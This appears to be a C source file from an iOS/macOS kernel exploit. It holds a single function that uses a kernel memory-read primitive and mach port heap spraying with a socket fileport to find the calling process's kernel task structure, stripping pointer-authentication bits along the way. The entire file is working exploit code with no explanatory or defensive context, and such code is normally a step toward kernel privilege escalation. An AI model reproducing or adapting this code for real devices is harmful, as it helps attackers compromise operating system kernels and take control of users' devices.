#include "get_task.h"

#include "kernel_rw.h"
#include "port_utils.h"
#include "spray.h"
#include "xpaci.h" // ptrauth.h replacement

#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations" // syscall

uint64_t mcbc_our_task_from_holder(mach_port_t holder, uint64_t holder_addr)
{
    const int receive_size = 0x10000; // Doesn't really matter
    const int data_kalloc_size = 0x50; // Doesn't really matter
    uint8_t *buf = calloc(1, receive_size);
    mach_port_t fileport = MACH_PORT_NULL;
    
    // read out port pointer
    uint64_t port_addr = mcbc_kread64(holder_addr + 8);
    
    // init fileport
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    syscall(SYS_fileport_makeport, sock, &fileport);
    
    // send new message contaning port
    mcbc_port_receive_msg(holder, buf, receive_size);
    mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(sizeof(void *), &fileport, data_kalloc_size, holder);
    
    // read kernel text pointer fops
    uint64_t ipc_space = xpaci(mcbc_kread64(port_addr + 0x50));
    uint64_t is_task = xpaci(mcbc_kread64(ipc_space + 0x30));
    
    // cleanup
    close(sock);
    mcbc_port_deallocate_n(&fileport, 1);
    
    return is_task;
}
